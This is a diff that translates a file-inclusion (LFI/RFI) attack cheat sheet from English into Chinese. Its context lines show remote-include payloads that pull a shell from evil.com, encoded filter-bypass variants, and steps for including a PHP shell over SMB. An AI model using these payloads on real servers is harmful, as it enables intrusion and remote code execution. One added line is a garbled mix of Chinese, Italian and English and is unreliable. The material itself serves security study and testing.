@@ -14,7 +14,7 @@
     * [路径与.截断](#路径与.截断)
     * [filter绕过技巧](#filter绕过技巧)
 * [基本的远程文件包含](#基本的远程文件包含)
-* [LFI / RFI using wrappers](#lfi--rfi-using-wrappers)
+* [LFI / RFI 使用包装器](#lfi--rfi-使用包装器)
   * [Wrapper php://filter](#wrapper-phpfilter)
   * [Wrapper zip://](#wrapper-zip)
   * [Wrapper data://](#wrapper-data)
@@ -101,16 +101,17 @@ http://example.com/index.php?page=http://evil.com/shell.txt%00
 http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
 ```
 
-### Bypass allow_url_include
+### 绕过allow_url_include
 
-When `allow_url_include` and `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows box using the `smb` protocol.
+当`allow_url_include` e `allow_url_fopen` are set to `Off`. It is still possible to include a remote file on Windows box using the `smb` protocol.
+当`allow_url_include` 和 `allow_url_fopen`都被设置成'Off'后，在windows平台下仍然可以包含一个远程文件使用smb协议
 
 1. Create a share open to everyone
 2. Write a PHP code inside a file : `shell.php`
 3. Include it `http://example.com/index.php?page=\\10.0.0.1\share\shell.php`
 
 
-## LFI / RFI using wrappers
+## lfi--rfi-使用包装器
 
 ### Wrapper php://filter
 
